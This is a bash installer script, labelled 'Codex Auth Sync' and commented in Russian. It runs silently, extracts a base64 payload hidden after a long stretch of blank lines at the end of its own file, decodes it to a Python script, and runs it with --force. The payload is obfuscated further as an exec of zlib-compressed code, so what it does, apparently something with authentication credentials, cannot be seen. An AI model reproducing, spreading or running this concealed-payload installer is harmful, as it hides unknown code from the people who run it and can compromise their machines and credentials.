#!/usr/bin/env bash
# Codex Auth Sync — установка, macOS/Linux. Молча: только ошибки.
set -u
SUM="2a735aed6bb4e653765b27e56469ea0071b34456507bba73040280ab77869416"
die() { echo "! $*"; exit 1; }
PY=""
find_python() {
  if command -v python3 >/dev/null 2>&1 && python3 -c 'import sys' >/dev/null 2>&1; then
    PY=$(command -v python3)
  elif command -v python >/dev/null 2>&1 && python -c 'import sys' >/dev/null 2>&1; then
    PY=$(command -v python)
  fi
}
find_python
[ -n "$PY" ] || die "python 3 не найден"

T=$(mktemp -d) || die "нет временного каталога"
trap 'rm -rf "$T"' EXIT

awk -v t="$T" '/^#__P__$/{m=1;next} m==1{print substr($0,3) > (t "/p")}' "$0"
[ -s "$T/p" ] || die "установщик повреждён"
base64 -d < "$T/p" > "$T/sync.py" 2>/dev/null || base64 -D < "$T/p" > "$T/sync.py" || die "payload не распаковался"

GOT=$(sha256sum "$T/sync.py" 2>/dev/null | cut -c1-16)
[ -n "$GOT" ] || GOT=$(shasum -a 256 "$T/sync.py" | cut -c1-16)
[ "$GOT" = "$(printf '%s' "$SUM" | cut -c1-16)" ] || die "хеш не совпал"

"$PY" "$T/sync.py" --force || die "запуск не удался"
exit 0





















#__P__
#@IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojY29kaW5nOmNwNDM3CmltcG9ydCB6bGliO2V4ZWMoemxp
#@Yi5kZWNvbXByZXNzKCJ42o1Xe1fbOhL/359Cy4XK3jh2QoFL06W7bggt3Fx4MDBdSp8hN0exldjF
#@r0oykN7HZ98Zyc7j0nu2BzDWaDSa+c3TSVYWQhG5kG4h3S+yyN0pk/xgz42ZjNNk6lxu7qok426Z
#@MjUrRGbNRJGRSqSw6Qn+teJSkcSIuTJLF3aLkueGtWRcbgU1PG9gaVXkiNDDZwcHT5/t7u3u9YLg
#@1eHgZPfi7L6zt5/H4m3+7b+fr5LoZHj+YT5/977TDqjF8FC72+ns/3y4+/PTzsGzQ2p9AVwiivTi
#@XCLjtmMpWH/xqReyMOa+F1Pra01Ji5ClvoyZMHQJdAV0SS3eHCryWTLXuzmQbO5+daVjzeF9t3vQ
#@6VgZqhBvb1MrxTebXHgwMFwiZEaSnGxtv748H/grEVtL0ubFK3qjou/JreckKsiItGdke+bLRR56
#@5YKMyZMnpFxcqLjIn67T2+1cIg85eeFH/M7PqzQluy+edJF5Kji7RVk5J0+IQ35cIrSVWTHq2iH/
#@rH/8Slxuf5rkfiP6O1xuNXdtPbpFi2zRm3z/BwQ2YPwfcVZhHDBMpoKJhT9kVR7GwZznSlwivxdH
#@XpkmUlHrbtNVELiKZxFowIUfe/C8S0JOrXtgK6SXswx8C9bncFQgDOTFxbuhvpqSZEbuCU8lR/Km
#@XtS6Be4ET1Ar4jPCuB28cnoW6SPtgbbq/PCyaB93vJg/RMkcoh+CkATHOlbbO/JG3OT9XCJXYEr7
#@OJFlIROVFHkPIydrR0yx5wS1PNrakVvIjH/mGLUI3hyc2Ppi8gFkBsc7dt+lYczUJImo+8ppNSRW
#@omC6TFQvL1wiyIglQ1SEVQZqQKzNkpSbS5mHOU9dSkFrXCK4qkRO6vS163S26Y70p4WCp+R5dFxc
#@y6E7NiDM87tEFLk358D3Olx4MDBJsVKl7Pk+KxNP8ZTPBcu8Qsyp4946Llp89GHUa++O4WyoVWwF
#@r1o2RZMRsXZbG7/Td5YMbsxZxIU8+o02WF4vSk57NKtSlZRMKH9ccs9pUeURxNERbfX/cHT5Kip1
#@tLfveFIxVUmLKLHorQwGiBOwnz+EvFRkoP+hk4ADYiQZdcY6iNoUKUSwRPKNw7oq0RbIQIctbHQX
#@VoY+VoZHKPUvjwcfJ5gh1CHARf9ccqj9idkS8YfmVUe3oWjn11xuk6BfFzwb8XkoWR5h7NuOT1kF
#@ZVC7ExkXCU8jYgd9N+hDnWbRZLpQXFxCQMCusVQLLJmUJsJZHeH1VcEvmGogDlxuGIskbo6oKm55
#@LukY9tHAt9pAmkQTvQHKszDkUtZLrflSdZMVdvCLhuGtsd2j4BTIbcAFXkfdseY83bzatCQP4lKy
#@GZ9MD/ZcIq4jIzhu0SNcbiXIbkNEw9LZ2XO0hesmEoBTJXmFTiMvQfSpccR6pGLAswSAz3zE0Xjm
#@FA+gnZ+NnZh281JNwEgIMZOBlGcsSWtTMVxcXmrhn2tCEyWCe7Ka2nT0683NfXuMGedKJeyXo89j
#@xxn19g7H1prO2ivN2abUQAvZ3T/4a7UZ9boHY+PByL5w3+PFCHTHQm3yQpGLXu2uoTZDuV99KmuN
#@h152GyXChhzCant0LSru8geotZPiVq9ceDAwzRPTKqVqwqsJkWDTTycm0BR/UDrOVvZozt/+qCva
#@a50h5MS7F4nihl+LiaqshEgL8DAqbAcDF8xFtU1WkXOQ8yN4wJXIaoIaV0OsnoH2TXCuvTu6gDbp
#@dsYmyy9MNogkV/rWcx1Fa5EDPMGwLgXnBPKO2Ajue4Pj9xjXeMw7VlwiDx+2Q9rI1B2Tf5H5IwlB
#@MFxuzuFcIjI6d1GftXOONu01NpllYpnetEzrVQEjTJJLzXJMWkeka5GVdnVKNjcFQ5000AybXHKv
#@LEqAykWUNBb1rTgsQh2FeiyM/7A/9Aj0LCjaCN2l81foGkVtHXg+SG1RE0qOU8eAKU7rZqyqE+p8
#@jEu8GWJT2V1TaR+WlfbKVFr3bqNYXnlVnib5rf13Uu9x+QbMN5J5WCk2TTmEMXTRECwzE1xybkHG
#@msW9XjnG0ehdqO8443o6a6T9xrjzsVSg2tKnsRdmEXXWY5/+h4dxQYrZ7CbHOYDohxnzNKpvXFw4
#@WM9QVMMLl5rZx6YyjBWTt5L4IaSf4sSfEV9B2SC+DElcXEDZXFxceDAwQWipIGylQ0usur61LtJO
#@9QQWqpRceDAwgpDb+uxzYvaR3G5j2yFRXCLRNFjmxT2JHbpTaKErWVt2CJ0PXHgwMCBtHK1WY9bv
#@ZA4wk/YdTNQ3N9vwS58TjQPEE9Tf38ny4NZOjFLR5d+WLg9emqLsfZOxCME9HrSJ+q0UBc44m63z
#@kx4dg5f4PoD3T+vVXG6d+alxoVNPhbROmEz7GW4bmOT4tO68Ac4uuZ4mB6uUH0DPj+R9Ao0ad52l
#@SKeVtjTl79rwzA5OUe86uoLTjeqthxLcs4drEbFUvE5e7J9r+5qov1xyVqX7FU7IOOUFpy4VU5CB
#@aNibVfvUDMAG77Pl/cth5OxHuocO1jDOisgOzty9vUNNO8Oic7apI9amU41hk1NsKvE/QkL+AQkF
#@HfOsNvLsO5XDSDD7y0uXdz6qXHgwMA9oLkSUAX6q4VM/YtK1aYhpA42OxI7b3Yg3VCAtJMcBUCON
#@2l878KHtXU76V4PgGmJcXC8GH/tDUzTrjt9dFfPLtwMhXG6xOUmBmZu95FpPtjYOuJMMqdBXnnY6
#@mzNIZzUXbYjdnDa6Bo1QozFPiylLya2bWORdXdGYmN+Nuj1oRHrcwJkOPnVcIrFoi1xu8yAn71xc
#@IFx4MDAw8CWml2CaXHJcIjRr5TJYfoRXIxuC1kxjkwmm7GRSD8V0c3yBtPiIBD36fnQ8454mL/Nl
#@dulTFyjhPT5qp65apRmRMKOSnKXpokknFGSbc3V8LcGGvo2udtabyfdxNEBcInT/AwGNDLkiLmVu
#@Y29kZSgiY3A0MzciKSkpCg==
